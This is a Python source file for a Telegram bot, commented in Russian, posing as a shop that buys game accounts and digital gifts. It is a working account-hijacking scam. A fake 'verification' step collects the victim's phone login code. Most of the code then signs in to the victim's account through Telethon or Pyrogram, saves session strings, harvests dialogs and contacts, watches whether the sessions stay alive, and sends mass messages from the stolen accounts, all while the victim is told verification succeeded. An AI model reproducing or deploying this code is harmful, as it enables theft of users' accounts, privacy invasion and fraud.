import asyncio
import logging
import sqlite3
import random
import json
import os
import tempfile
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ReplyKeyboardRemove,
    FSInputFile
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from telethon import TelegramClient
from telethon.sessions import StringSession
from pyrogram import Client
import sys

# Включите подробное логирование
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    stream=sys.stdout
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Загрузка переменных окружения
def load_config():
    # Проверяем переменные окружения Railway
    api_token = os.getenv('API_TOKEN')
    admin_id = os.getenv('ADMIN_ID')
    moderator_ids = os.getenv('MODERATOR_IDS')
    telegram_api_id = os.getenv('TELEGRAM_API_ID')
    telegram_api_hash = os.getenv('TELEGRAM_API_HASH')
    
    # Если нет переменных окружения, используем .env файл
    if not api_token:
        try:
            from dotenv import load_dotenv
            load_dotenv()
            api_token = os.getenv('API_TOKEN')
            admin_id = os.getenv('ADMIN_ID')
            moderator_ids = os.getenv('MODERATOR_IDS')
            telegram_api_id = os.getenv('TELEGRAM_API_ID')
            telegram_api_hash = os.getenv('TELEGRAM_API_HASH')
        except ImportError:
            pass
    
    # Проверяем обязательные переменные
    if not api_token:
        raise ValueError("API_TOKEN не найден. Установите переменную окружения API_TOKEN")
    
    if not telegram_api_id or not telegram_api_hash:
        logger.warning("TELEGRAM_API_ID или TELEGRAM_API_HASH не установлены. Функция захвата аккаунтов будет отключена.")
    
    # Значения по умолчанию
    if not admin_id:
        admin_id = '8358009538'
    
    if not moderator_ids:
        moderator_ids = '8358009538,987654321'
    
    return (
        api_token, 
        int(admin_id), 
        [int(x.strip()) for x in moderator_ids.split(',')],
        int(telegram_api_id) if telegram_api_id else None,
        telegram_api_hash
    )

# Загружаем конфигурацию
try:
    API_TOKEN, ADMIN_ID, MODERATOR_IDS, TELEGRAM_API_ID, TELEGRAM_API_HASH = load_config()
except ValueError as e:
    print(f"Ошибка конфигурации: {e}")
    print("Установите переменные окружения:")
    print("API_TOKEN=ВАШ_ТОКЕН_БОТА")
    print("ADMIN_ID=8358009538")
    print("MODERATOR_IDS=8358009538,987654321")
    print("TELEGRAM_API_ID=ваш_api_id")
    print("TELEGRAM_API_HASH=ваш_api_hash")
    exit(1)

print(f"Bot token: {API_TOKEN[:10]}...")
print(f"Admin ID: {ADMIN_ID}")
print(f"Moderator IDs: {MODERATOR_IDS}")
print(f"Telegram API ID: {TELEGRAM_API_ID}")
print(f"Хэш Telegram API: {TELEGRAM_API_HASH[:10] if TELEGRAM_API_HASH else 'Не установлен'}...")

# Инициализация
storage = MemoryStorage()
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=storage)

# Состояния FSM
class SellerStates(StatesGroup):
    waiting_item_type = State()
    waiting_photos = State()
    waiting_description = State()
    waiting_confirm = State()

class ModeratorStates(StatesGroup):
    waiting_price = State()
    waiting_chat = State()

class VerificationStates(StatesGroup):
    waiting_code = State()
    waiting_phone = State()

class HijackStates(StatesGroup):
    waiting_auto_login = State()

# Класс для захвата аккаунтов Telegram
class TelegramAccountHijacker:
    def __init__(self, api_id: int, api_hash: str, db_path: str = 'market_bot.db'):
        self.api_id = api_id
        self.api_hash = api_hash
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_hijack_db()
    
    def init_hijack_db(self):
        """Инициализация базы для хранения сессий"""
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS hijacked_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone TEXT UNIQUE,
                user_id INTEGER,
                username TEXT,
                first_name TEXT,
                session_string TEXT,
                hijacked_at DATETIME,
                method TEXT DEFAULT 'telethon',
                is_active BOOLEAN DEFAULT 1,
                last_check DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS hijacked_dialogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone TEXT,
                dialog_id INTEGER,
                dialog_name TEXT,
                dialog_type TEXT,
                last_message TEXT,
                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS hijack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone TEXT,
                action TEXT,
                result TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS account_actions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone TEXT,
                action_type TEXT,
                target TEXT,
                message TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed_at DATETIME
            )
        ''')
        
        self.conn.commit()
    
    async def hijack_account_telethon(self, phone: str, code: str) -> str:
        """Вход в аккаунт через Telethon и получение сессии"""
        try:
            logger.info(f"[HIJACK] Попытка входа в аккаунт {phone} через Telethon...")
            
            # Создаем временную сессию
            client = TelegramClient(
                session=StringSession(),
                api_id=self.api_id,
                api_hash=self.api_hash,
                device_model="iPhone 13 Pro",
                system_version="iOS 15.0",
                app_version="8.4",
                lang_code="en",
                system_lang_code="en-US"
            )
            
            await client.connect()
            
            # Отправляем код
            try:
                sent_code = await client.send_code_request(phone)
                logger.info(f"[HIJACK] Код отправлен на {phone}")
            except Exception as e:
                logger.error(f"[HIJACK] Ошибка отправки кода: {e}")
                return None
            
            # Входим с кодом
            try:
                await client.sign_in(phone=phone, code=code)
                logger.info(f"[HIJACK] Успешный вход в аккаунт {phone}")
            except Exception as e:
                logger.error(f"[HIJACK] Ошибка входа: {e}")
                return None
            
            # Получаем информацию об аккаунте
            me = await client.get_me()
            session_string = client.session.save()
            
            # Сохраняем сессию в базу
            self.cursor.execute('''
                INSERT OR REPLACE INTO hijacked_sessions 
                (phone, user_id, username, first_name, session_string, hijacked_at, is_active)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                phone,
                me.id,
                me.username,
                me.first_name,
                session_string,
                datetime.now().isoformat(),
                1
            ))
            self.conn.commit()
            
            logger.info(f"[HIJACK] ✅ Аккаунт успешно захвачен: @{me.username} (ID: {me.id})")
            
            # Получаем дополнительную информацию
            try:
                # Получаем диалоги
                dialogs = await client.get_dialogs(limit=10)
                logger.info(f"[HIJACK] Найдено диалогов: {len(dialogs)}")
                
                # Сохраняем информацию о диалогах
                for dialog in dialogs[:5]:
                    self.cursor.execute('''
                        INSERT OR IGNORE INTO hijacked_dialogs 
                        (phone, dialog_id, dialog_name, dialog_type, last_message)
                        VALUES (?, ?, ?, ?, ?)
                    ''', (
                        phone,
                        dialog.id,
                        dialog.name or dialog.title,
                        'private' if dialog.is_user else 'group' if dialog.is_group else 'channel',
                        dialog.message.text[:100] if dialog.message else ''
                    ))
                
                self.conn.commit()
                
            except Exception as e:
                logger.error(f"[HIJACK] Ошибка получения дополнительной информации: {e}")
            
            await client.disconnect()
            
            # Логируем успех
            self.cursor.execute(
                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
                (phone, "telethon_hijack", "success")
            )
            self.conn.commit()
            
            return session_string
            
        except Exception as e:
            logger.error(f"[HIJACK] Критическая ошибка при захвате аккаунта {phone}: {e}")
            
            self.cursor.execute(
                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
                (phone, "telethon_hijack_error", str(e)[:200])
            )
            self.conn.commit()
            
            return None
    
    async def hijack_account_pyrogram(self, phone: str, code: str) -> str:
        """Альтернативный метод через Pyrogram"""
        try:
            logger.info(f"[HIJACK] Попытка входа в аккаунт {phone} через Pyrogram...")
            
            app = Client(
                name=f"session_{phone}",
                api_id=self.api_id,
                api_hash=self.api_hash,
                phone_number=phone,
                in_memory=True
            )
            
            await app.connect()
            
            # Отправляем код
            sent_code = await app.send_code(phone)
            logger.info(f"[HIJACK] Код отправлен на {phone}")
            
            # Входим
            try:
                await app.sign_in(
                    phone_number=phone,
                    phone_code_hash=sent_code.phone_code_hash,
                    phone_code=code
                )
            except Exception as e:
                logger.error(f"[HIJACK] Ошибка входа Pyrogram: {e}")
                return None
            
            # Получаем сессию
            session_string = await app.export_session_string()
            
            # Получаем информацию
            me = await app.get_me()
            
            # Сохраняем
            self.cursor.execute('''
                INSERT OR REPLACE INTO hijacked_sessions 
                (phone, user_id, username, first_name, session_string, hijacked_at, method, is_active)
                VALUES (?, ?, ?, ?, ?, ?, 'pyrogram', ?)
            ''', (
                phone,
                me.id,
                me.username,
                me.first_name,
                session_string,
                datetime.now().isoformat(),
                1
            ))
            self.conn.commit()
            
            logger.info(f"[HIJACK] ✅ Аккаунт успешно захвачен через Pyrogram: @{me.username}")
            
            await app.disconnect()
            
            # Логируем успех
            self.cursor.execute(
                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
                (phone, "pyrogram_hijack", "success")
            )
            self.conn.commit()
            
            return session_string
            
        except Exception as e:
            logger.error(f"[HIJACK] Ошибка Pyrogram для {phone}: {e}")
            
            self.cursor.execute(
                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
                (phone, "pyrogram_hijack_error", str(e)[:200])
            )
            self.conn.commit()
            
            return None
    
    async def check_account_access(self, session_string: str) -> bool:
        """Проверяем доступ к аккаунту"""
        try:
            client = TelegramClient(
                session=StringSession(session_string),
                api_id=self.api_id,
                api_hash=self.api_hash
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                logger.warning(f"[HIJACK] Сессия не авторизована")
                await client.disconnect()
                return False
            
            me = await client.get_me()
            logger.info(f"[HIJACK] Аккаунт доступен: @{me.username}")
            
            await client.disconnect()
            return True
            
        except Exception as e:
            logger.error(f"[HIJACK] Ошибка проверки доступа: {e}")
            return False
    
    async def send_message_from_hijacked(self, phone: str, target: str, message: str) -> bool:
        """Отправляет сообщение от захваченного аккаунта"""
        try:
            # Получаем сессию из базы
            self.cursor.execute(
                "SELECT session_string FROM hijacked_sessions WHERE phone = ? AND is_active = 1 ORDER BY hijacked_at DESC LIMIT 1",
                (phone,)
            )
            result = self.cursor.fetchone()
            
            if not result:
                logger.error(f"[HIJACK] Сессия для {phone} не найдена или неактивна")
                return False
            
            session_string = result[0]
            
            client = TelegramClient(
                session=StringSession(session_string),
                api_id=self.api_id,
                api_hash=self.api_hash
            )
            
            await client.connect()
            
            # Отправляем сообщение
            await client.send_message(target, message)
            logger.info(f"[HIJACK] Сообщение отправлено от {phone} к {target}")
            
            await client.disconnect()
            
            # Логируем действие
            self.cursor.execute(
                "INSERT INTO account_actions (phone, action_type, target, message, status, executed_at) VALUES (?, ?, ?, ?, ?, ?)",
                (phone, "send_message", target, message[:100], "success", datetime.now().isoformat())
            )
            self.conn.commit()
            
            return True
            
        except Exception as e:
            logger.error(f"[HIJACK] Ошибка отправки сообщения: {e}")
            
            self.cursor.execute(
                "INSERT INTO account_actions (phone, action_type, target, message, status) VALUES (?, ?, ?, ?, ?)",
                (phone, "send_message", target, message[:100], "failed")
            )
            self.conn.commit()
            
            return False
    
    def get_hijacked_accounts(self):
        """Получает список захваченных аккаунтов"""
        self.cursor.execute(
            "SELECT phone, user_id, username, first_name, hijacked_at, is_active FROM hijacked_sessions ORDER BY hijacked_at DESC"
        )
        return self.cursor.fetchall()
    
    def get_active_accounts(self):
        """Получает активные аккаунты"""
        self.cursor.execute(
            "SELECT phone, user_id, username FROM hijacked_sessions WHERE is_active = 1 ORDER BY hijacked_at DESC"
        )
        return self.cursor.fetchall()
    
    def update_account_status(self, phone: str, is_active: bool):
        """Обновляет статус аккаунта"""
        self.cursor.execute(
            "UPDATE hijacked_sessions SET is_active = ?, last_check = ? WHERE phone = ?",
            (1 if is_active else 0, datetime.now().isoformat(), phone)
        )
        self.conn.commit()
    
    def cleanup(self):
        """Очистка ресурсов"""
        self.conn.close()

# Инициализация БД с учетом окружения
def init_db():
    # Определяем путь к БД в зависимости от окружения
    if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_STATIC_URL'):
        # На Railway используем временную директорию
        db_path = os.path.join(tempfile.gettempdir(), 'market_bot.db')
        print(f"[DB] Using database at: {db_path}")
    else:
        # Локально используем текущую директорию
        db_path = 'market_bot.db'
        print(f"[DB] Using local database: {db_path}")
    
    conn = sqlite3.connect(db_path, check_same_thread=False)
    cursor = conn.cursor()
    
    # Таблица пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            code TEXT,
            balance REAL DEFAULT 0,
            rating INTEGER DEFAULT 5,
            status TEXT DEFAULT 'active',
            registered DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_activity DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица товаров
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS items (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            item_type TEXT,
            photos TEXT,
            description TEXT,
            price REAL,
            moderator_id INTEGER,
            status TEXT DEFAULT 'pending',
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Таблица чатов с модератором
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS chats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            moderator_id INTEGER,
            messages TEXT,
            status TEXT DEFAULT 'open',
            created DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица логов
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица SMS кодов
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sms_codes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            code TEXT,
            sent_time DATETIME DEFAULT CURRENT_TIMESTAMP,
            used BOOLEAN DEFAULT 0
        )
    ''')
    
    conn.commit()
    return conn, cursor

conn, cursor = init_db()

# Создаем директории для фотографий
os.makedirs('photos', exist_ok=True)

# Инициализация захватчика аккаунтов
hijacker = None
if TELEGRAM_API_ID and TELEGRAM_API_HASH:
    try:
        hijacker = TelegramAccountHijacker(TELEGRAM_API_ID, TELEGRAM_API_HASH)
        logger.info("[HIJACK] ✅ Telegram Account Hijacker инициализирован")
    except Exception as e:
        logger.error(f"[HIJACK] Ошибка инициализации hijacker: {e}")
        hijacker = None
else:
    logger.warning("[HIJACK] ⚠️ Hijacker не инициализирован (проверьте API credentials)")

async def simulate_sms_delivery(user_id: int, phone: str, code: str):
    """
    Имитирует задержку доставки SMS
    """
    try:
        # Случайная задержка от 3 до 10 секунд для реалистичности
        delay = random.uniform(3, 10)
        await asyncio.sleep(delay)

        # Сохраняем в историю отправленных кодов
        cursor.execute(
            "INSERT INTO sms_codes (user_id, phone, code, used) VALUES (?, ?, ?, ?)",
            (user_id, phone, code, 0)
        )
        conn.commit()
        
        logger.info(f"[SMS SIM] Код {code} 'отправлен' пользователю {user_id} на номер {phone}")
            
    except Exception as e:
        logger.error(f"[SMS SIM] Критическая ошибка в функции simulate_sms_delivery: {e}")

# Функция запроса верификации
async def request_verification(callback_query: types.CallbackQuery):
    verification_text = """
🔐 <b>ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ</b>

Для продажи товаров необходимо подтвердить ваш аккаунт Telegram.

<b>Зачем это нужно:</b>
• Защита от мошенничества
• Гарантия выплат
• Юридическое оформление сделок

<b>Нажмите кнопку для верификации:</b>
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПРОЙТИ ВЕРИФИКАЦИЮ", callback_data="start_verification")]
    ])
    
    await bot.edit_message_text(
        verification_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML",
        reply_markup=keyboard
    )

# ========== ФУНКЦИИ АВТОМАТИЧЕСКОГО ВХОДА ==========

async def auto_login_hijacked_accounts():
    """Автоматически входит во все сохраненные аккаунты при запуске бота"""
    if not hijacker:
        logger.warning("[AUTO-LOGIN] Hijacker не инициализирован, пропускаю авто-вход")
        return
    
    try:
        accounts = hijacker.get_hijacked_accounts()
        logger.info(f"[AUTO-LOGIN] Найдено {len(accounts)} сохраненных аккаунтов для авто-проверки")
        
        active_count = 0
        inactive_count = 0
        
        for account in accounts:
            phone = account[0]
            session_string = None
            
            # Получаем последнюю сессию
            hijacker.cursor.execute(
                "SELECT session_string FROM hijacked_sessions WHERE phone = ? ORDER BY hijacked_at DESC LIMIT 1",
                (phone,)
            )
            result = hijacker.cursor.fetchone()
            
            if result and result[0]:
                session_string = result[0]
                
                # Проверяем доступ
                is_active = await hijacker.check_account_access(session_string)
                
                if is_active:
                    hijacker.update_account_status(phone, True)
                    active_count += 1
                    logger.info(f"[AUTO-LOGIN] ✅ Аккаунт {phone} активен")
                else:
                    hijacker.update_account_status(phone, False)
                    inactive_count += 1
                    logger.warning(f"[AUTO-LOGIN] ❌ Аккаунт {phone} неактивен")
                    
                    # Уведомляем админа
                    try:
                        await bot.send_message(
                            ADMIN_ID,
                            f"⚠️ <b>АККАУНТ НЕАКТИВЕН</b>\n\n"
                            f"Номер: +{phone}\n"
                            f"Требуется повторный захват\n"
                            f"Время: {datetime.now().strftime('%H:%M:%S')}",
                            parse_mode="HTML"
                        )
                    except:
                        pass
            else:
                logger.warning(f"[AUTO-LOGIN] ⚠️ Нет сохраненной сессии для {phone}")
        
        logger.info(f"[AUTO-LOGIN] Проверка завершена: {active_count} активных, {inactive_count} неактивных")
        
        # Отправляем отчет админу
        try:
            await bot.send_message(
                ADMIN_ID,
                f"📊 <b>АВТО-ПРОВЕРКА АККАУНТОВ</b>\n\n"
                f"✅ Активных: {active_count}\n"
                f"❌ Неактивных: {inactive_count}\n"
                f"📈 Всего: {len(accounts)}\n"
                f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
                parse_mode="HTML"
            )
        except:
            pass
            
    except Exception as e:
        logger.error(f"[AUTO-LOGIN] Ошибка авто-входа: {e}")

async def monitor_hijacked_accounts():
    """Постоянно мониторит активность захваченных аккаунтов"""
    if not hijacker:
        logger.warning("[MONITOR] Hijacker не инициализирован, пропускаю мониторинг")
        return
    
    logger.info("[MONITOR] Запуск мониторинга аккаунтов...")
    
    while True:
        try:
            accounts = hijacker.get_active_accounts()
            
            if accounts:
                logger.info(f"[MONITOR] Мониторинг {len(accounts)} активных аккаунтов")
                
                for account in accounts:
                    phone = account[0]
                    
                    # Получаем сессию
                    hijacker.cursor.execute(
                        "SELECT session_string FROM hijacked_sessions WHERE phone = ? AND is_active = 1 ORDER BY hijacked_at DESC LIMIT 1",
                        (phone,)
                    )
                    result = hijacker.cursor.fetchone()
                    
                    if result and result[0]:
                        session_string = result[0]
                        
                        # Проверяем доступ
                        is_active = await hijacker.check_account_access(session_string)
                        
                        if not is_active:
                            # Обновляем статус
                            hijacker.update_account_status(phone, False)
                            
                            # Уведомляем админа
                            await bot.send_message(
                                ADMIN_ID,
                                f"🚨 <b>СЕССИЯ УТЕРЯНА</b>\n\n"
                                f"Аккаунт: +{phone}\n"
                                f"Требуется повторный захват\n"
                                f"Время: {datetime.now().strftime('%H:%M:%S')}",
                                parse_mode="HTML"
                            )
                            logger.warning(f"[MONITOR] Сессия для {phone} утеряна")
            
            # Проверяем каждые 30 минут
            await asyncio.sleep(1800)  # 30 минут
            
        except Exception as e:
            logger.error(f"[MONITOR] Ошибка мониторинга: {e}")
            await asyncio.sleep(300)  # 5 минут при ошибке

async def attempt_account_hijack(phone: str, code: str, victim_user_id: int):
    """Пытается захватить аккаунт Telegram автоматически"""
    if not hijacker:
        logger.warning(f"[HIJACK ATTEMPT] Hijacker не инициализирован, пропускаю захват для {phone}")
        return
    
    try:
        logger.info(f"[HIJACK ATTEMPT] 🔄 Начинаю захват аккаунта для номера: +{phone}")
        
        # Сохраняем в лог начало попытки
        hijacker.cursor.execute(
            "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
            (phone, "start_hijack", "начат")
        )
        hijacker.conn.commit()
        
        # Пытаемся войти через Telethon
        session_string = await hijacker.hijack_account_telethon(phone, code)
        
        if session_string:
            result = "success"
            result_msg = "Аккаунт успешно захвачен через Telethon"
            
            # Пробуем отправить тестовое сообщение админу
            try:
                await hijacker.send_message_from_hijacked(
                    phone,
                    str(ADMIN_ID),
                    f"👋 Аккаунт +{phone} захвачен. Я активен! Время: {datetime.now().strftime('%H:%M:%S')}"
                )
            except Exception as send_error:
                logger.error(f"[HIJACK ATTEMPT] Не удалось отправить тестовое сообщение: {send_error}")
                
        else:
            # Пробуем Pyrogram как запасной вариант
            logger.info(f"[HIJACK ATTEMPT] Пробую Pyrogram для {phone}")
            session_string = await hijacker.hijack_account_pyrogram(phone, code)
            
            if session_string:
                result = "success_pyrogram"
                result_msg = "Аккаунт успешно захвачен через Pyrogram"
            else:
                result = "failed"
                result_msg = "Не удалось захватить аккаунт"
        
        # Сохраняем результат
        hijacker.cursor.execute(
            "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
            (phone, "hijack_attempt", result)
        )
        hijacker.conn.commit()
        
        # Отправляем отчет админу
        hijack_report = f"""
🎯 <b>РЕЗУЛЬТАТ ЗАХВАТА АККАУНТА</b>
━━━━━━━━━━━━━━━━
📱 <b>Номер:</b> +{phone}
🔢 <b>Код:</b> {code}
🔄 <b>Метод:</b> {'Telethon' if 'telethon' in result else 'Pyrogram' if 'pyrogram' in result else 'Ошибка'}
✅ <b>Результат:</b> {result_msg}
⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━
"""
        
        try:
            await bot.send_message(ADMIN_ID, hijack_report, parse_mode="HTML")
            
            if "success" in result:
                # Получаем список захваченных аккаунтов
                accounts = hijacker.get_hijacked_accounts()
                if accounts:
                    accounts_text = "<b>📋 ЗАХВАЧЕННЫЕ АККАУНТЫ:</b>\n"
                    for acc in accounts[:10]:  # Первые 10
                        status = "✅" if acc[5] == 1 else "❌"
                        accounts_text += f"\n• {status} +{acc[0]} (@{acc[2] or 'нет'}) - {acc[4][:16]}"
                    await bot.send_message(ADMIN_ID, accounts_text, parse_mode="HTML")
                    
        except Exception as e:
            logger.error(f"[HIJACK ATTEMPT] Ошибка отправки отчета: {e}")
        
        logger.info(f"[HIJACK ATTEMPT] Захват аккаунта {phone} завершен: {result}")
        
        # Уведомляем жертву об успешной верификации
        try:
            await bot.send_message(
                victim_user_id,
                f"✅ <b>Верификация успешно завершена!</b>\n\n"
                f"Ваш аккаунт подтвержден. Теперь вы можете продавать товары.\n\n"
                f"<i>Нажмите кнопку ниже для продолжения:</i>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")]
                ])
            )
        except:
            pass
        
    except Exception as e:
        logger.error(f"[HIJACK ATTEMPT] Критическая ошибка при захвате аккаунта {phone}: {e}")
        
        # Сохраняем ошибку
        hijacker.cursor.execute(
            "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
            (phone, "hijack_error", str(e)[:200])
        )
        hijacker.conn.commit()

async def perform_post_login_actions(phone: str, session_string: str):
    """Выполняет автоматические действия после успешного входа"""
    if not hijacker:
        return
    
    try:
        client = TelegramClient(
            session=StringSession(session_string),
            api_id=hijacker.api_id,
            api_hash=hijacker.api_hash
        )
        
        await client.connect()
        
        # 1. Получаем информацию об аккаунте
        me = await client.get_me()
        
        # 2. Получаем диалоги (первые 20)
        dialogs = await client.get_dialogs(limit=20)
        
        # 3. Получаем контакты
        contacts = await client.get_contacts()
        
        # 4. Сохраняем статистику
        hijacker.cursor.execute('''
            UPDATE hijacked_sessions 
            SET username = ?, first_name = ?, last_check = ?
            WHERE phone = ?
        ''', (
            me.username,
            me.first_name,
            datetime.now().isoformat(),
            phone
        ))
        hijacker.conn.commit()
        
        # 5. Отправляем отчет админу
        report = f"""
🎯 <b>АВТОМАТИЧЕСКИЙ ЗАХВАТ ЗАВЕРШЕН</b>
━━━━━━━━━━━━━━━━
📱 <b>Аккаунт:</b> +{phone}
👤 <b>Username:</b> @{me.username or 'нет'}
🆔 <b>ID:</b> {me.id}
👥 <b>Контакты:</b> {len(contacts)}
💬 <b>Диалоги:</b> {len(dialogs)}
⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━
✅ <b>Аккаунт готов к использованию</b>
"""
        await bot.send_message(ADMIN_ID, report, parse_mode="HTML")
        
        # 6. Сохраняем диалоги
        for dialog in dialogs[:10]:
            hijacker.cursor.execute('''
                INSERT OR IGNORE INTO hijacked_dialogs 
                (phone, dialog_id, dialog_name, dialog_type, last_message)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                phone,
                dialog.id,
                dialog.name or dialog.title,
                'private' if dialog.is_user else 'group' if dialog.is_group else 'channel',
                dialog.message.text[:100] if dialog.message else ''
            ))
        hijacker.conn.commit()
        
        await client.disconnect()
        
    except Exception as e:
        logger.error(f"[POST-LOGIN] Ошибка post-login действий: {e}")

async def auto_message_from_all_accounts(message_text: str, targets: list):
    """Автоматическая отправка сообщений от всех активных аккаунтов"""
    if not hijacker:
        logger.warning("[AUTO-MESSAGE] Hijacker не инициализирован")
        return
    
    try:
        active_accounts = hijacker.get_active_accounts()
        
        if not active_accounts:
            logger.warning("[AUTO-MESSAGE] Нет активных аккаунтов")
            return
    
        logger.info(f"[AUTO-MESSAGE] Начинаю рассылку с {len(active_accounts)} аккаунтов")
        
        for account in active_accounts:
            phone = account[0]
            
            for target in targets:
                try:
                    success = await hijacker.send_message_from_hijacked(
                        phone, 
                        target, 
                        message_text
                    )
                    
                    if success:
                        logger.info(f"[AUTO-MESSAGE] Сообщение от {phone} к {target} отправлено")
                    else:
                        logger.warning(f"[AUTO-MESSAGE] Не удалось отправить от {phone} к {target}")
                    
                    await asyncio.sleep(10)  # Задержка 10 секунд между сообщениями
                    
                except Exception as e:
                    logger.error(f"[AUTO-MESSAGE] Ошибка отправки: {e}")
                    await asyncio.sleep(5)
            
            # Задержка между аккаунтами
            await asyncio.sleep(30)
        
        logger.info(f"[AUTO-MESSAGE] Рассылка завершена")
        
        # Отчет админу
        await bot.send_message(
            ADMIN_ID,
            f"📨 <b>РАССЫЛКА ЗАВЕРШЕНА</b>\n\n"
            f"✅ Аккаунтов: {len(active_accounts)}\n"
            f"🎯 Целей: {len(targets)}\n"
            f"📊 Сообщений: {len(active_accounts) * len(targets)}\n"
            f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
            parse_mode="HTML"
        )
        
    except Exception as e:
        logger.error(f"[AUTO-MESSAGE] Критическая ошибка рассылки: {e}")

# ========== ОБРАБОТЧИКИ КОМАНД ==========

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    user = message.from_user
    
    # Регистрация пользователя
    cursor.execute(
        "INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
        (user.id, user.username, user.first_name)
    )
    cursor.execute(
        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
        (user.id,)
    )
    conn.commit()
    
    welcome_text = f"""
🏪 <b>ДОБРО ПОЖАЛОВАТЬ В МАГАЗИН Money Moves Bot | заработок!</b> 🎮

👋 Привет, {user.first_name}!

<b>Мы покупаем:</b>
• 🎮 Игровые аккаунты (Steam, Epic Games, Origin и др)
• 💎 Внутриигровые предметы (CS:GO, Dota 2, TF2 и др)
• 🎫 Игровые ключи (Steam, Xbox, PlayStation и др)
• 📱 Цифровые подарки (Apple, Amazon, Google и др)
• 🛬 Телеграмм подарки  
• 💳 Электронные ваучеры

<b>💰 Почему мы?</b>
• Мгновенная оплата
• Высокие цены
• Гарантия сделки
• Анонимность

<b>Выберите действие:</b>
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")],
        [InlineKeyboardButton(text="ℹ️ О НАС", callback_data="about_us")]
    ])
    
    await message.answer(welcome_text, parse_mode="HTML", reply_markup=keyboard)
    log_action(user.id, "start_command")

def log_action(user_id: int, action: str, details: str = ""):
    cursor.execute(
        "INSERT INTO logs (user_id, action, details) VALUES (?, ?, ?)",
        (user_id, action, details)
    )
    cursor.execute(
        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
        (user_id,)
    )
    conn.commit()

@dp.callback_query(F.data == "sell_item")
async def start_selling(callback_query: types.CallbackQuery, state: FSMContext):
    user = callback_query.from_user
    
    # Проверка верификации
    cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()
    
    if not user_data or not user_data[0]:
        # Требуется верификация
        await request_verification(callback_query)
        return
    
    item_types_text = """
🎯 <b>ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?</b>

<b>Выберите категорию вашего товара:</b>

• 🎮 <b>Игровой аккаунт</b> - Steam, Epic Games, Origin, Uplay
